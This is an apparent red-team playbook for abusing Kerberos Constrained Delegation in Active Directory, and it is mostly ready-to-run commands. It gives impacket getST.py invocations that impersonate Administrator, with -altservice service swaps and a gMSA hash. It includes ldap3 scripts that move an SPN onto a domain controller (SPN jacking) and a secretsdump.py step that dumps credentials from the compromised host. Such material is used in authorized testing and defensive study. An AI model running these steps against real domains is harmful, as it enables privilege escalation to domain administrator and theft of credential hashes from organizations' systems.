# Kerberos Constrained Delegation (KCD) Abuse

## When this applies

- AD environment with a user/service account that has `msDS-AllowedToDelegateTo` set (and the `TRUSTED_TO_AUTH_FOR_DELEGATION` UAC flag).
- You have the credentials/hash for that delegating account.
- Goal: impersonate any user (including Administrator) to one of the allowed services.

## Technique

S4U2Self obtains a forwardable TGS for any user TO the delegating account. S4U2Proxy then presents that TGS to obtain a service ticket for the target SPN. The result is a service ticket as Administrator usable against the configured service.

## Steps

```bash
# When a user/service has msDS-AllowedToDelegateTo set (and TRUSTED_TO_AUTH_FOR_DELEGATION UAC flag):
# S4U2Self gets a forwardable ticket for any user TO the delegating account
# S4U2Proxy presents that ticket to get a service ticket for the target SPN

# Basic KCD abuse — impersonate Administrator to the allowed target service:
getST.py -spn 'HTTP/TARGET.domain.com' -impersonate Administrator \
  -dc-ip DC_IP 'domain/kcd_user:password'

# -altservice: changes the SPN in the ccache AFTER getting the ticket
# The encrypted ticket is still keyed to the TARGET account (same key), so alternate
# service classes on the SAME host work (e.g., HTTP→cifs, HTTP→LDAP):
getST.py -spn 'HTTP/TARGET.domain.com' -impersonate Administrator \
  -dc-ip DC_IP -altservice 'cifs/TARGET.domain.com' 'domain/kcd_user:password'
# ⚠ -altservice to a DIFFERENT host FAILS — ticket is encrypted with TARGET$'s key,
#    other hosts can't decrypt it. Use SPN jacking (below) to redirect to a different host.

# When the constrained delegation only authorizes ONE SPN (e.g., WWW/dc) and you
# need a different service class on the same host (CIFS for SMB, HTTP for WinRM,
# LDAP for replication, etc.), -altservice swaps the service name on the issued
# ticket. AD does NOT validate the service-name field on S4U2proxy tickets — the
# ticket is keyed to the target account, so any service running as that account
# accepts it. Same-host swap with a gMSA NT hash:
getST.py -spn 'WWW/dc.domain.local' -altservice 'cifs/dc.domain.local' \
  -impersonate Administrator -hashes ':<gmsa_nthash>' \
  -dc-ip DC_IP 'domain.local/<svc_account>$'
# Resulting ccache works for SMB to dc.domain.local even though only WWW/dc was
# in msDS-AllowedToDelegateTo.
```

## SPN Jacking (KCD + WriteSPN Abuse)

```bash
# When you have KCD to SPN/HOSTA but want to compromise HOSTB:
# Requires: WriteSPN on HOSTA$ (to remove the SPN) AND WriteSPN on HOSTB$ (to add it)
# WriteSPN can come from: GenericAll, GenericWrite, WriteProperty on servicePrincipalName,
#   or WRITE_PROP on Validated-SPN GUID (f3a64788-5306-11d1-a9c5-0000f80367c1)
# ⚠ WRITE_PROP (0x20) on Validated-SPN GUID bypasses hostname validation — can add
#   arbitrary SPN hostnames despite "Validated Write" name. Test it!

# Step 1: Remove target SPN from original owner
python3 -c "
import ldap3; from ldap3 import MODIFY_DELETE, MODIFY_ADD
conn = ldap3.Connection(ldap3.Server('ldaps://DC_IP', use_ssl=True, tls=ldap3.Tls(validate=0)),
  user='domain\\\\user', password='pass', authentication=ldap3.NTLM); conn.bind()
conn.modify('CN=HOSTA,CN=Computers,DC=domain,DC=com',
  {'servicePrincipalName': [(MODIFY_DELETE, ['HTTP/HOSTA'])]})"

# Step 2: Add that SPN to the target machine you want to compromise
python3 -c "
conn.modify('CN=HOSTB,OU=Domain Controllers,DC=domain,DC=com',
  {'servicePrincipalName': [(MODIFY_ADD, ['HTTP/HOSTA'])]})"

# Step 3: S4U2Proxy — KDC now resolves HTTP/HOSTA → HOSTB$ → encrypts with HOSTB$'s key
getST.py -spn 'HTTP/HOSTA' -impersonate Administrator \
  -dc-ip DC_IP -altservice 'cifs/HOSTB.domain.com' 'domain/kcd_user:password'

# Step 4: Use the ticket (encrypted with HOSTB$'s key, HOSTB can decrypt it)
KRB5CCNAME=Administrator@cifs_HOSTB.domain.com.ccache secretsdump.py -k -no-pass HOSTB.domain.com

# Step 5: CLEAN UP — restore SPNs to original state
# Enumeration: check for groups with WriteSPN on multiple computer objects (BloodHound edge: WriteSPN)
```

## Verifying success

- `KRB5CCNAME=...ccache klist` lists a TGS for the target SPN.
- `secretsdump.py -k -no-pass <target>` or `psexec.py -k -no-pass` succeeds against the target.

## Common pitfalls

- `-altservice` to a DIFFERENT host fails — same-host swaps only.
- For cross-host scenarios, use SPN jacking with `WriteSPN`.
- Always restore SPNs after exploitation.

## Tools

- impacket `getST.py`
- ldap3 (Python) for SPN modification
- bloodyAD (alternative SPN modification)
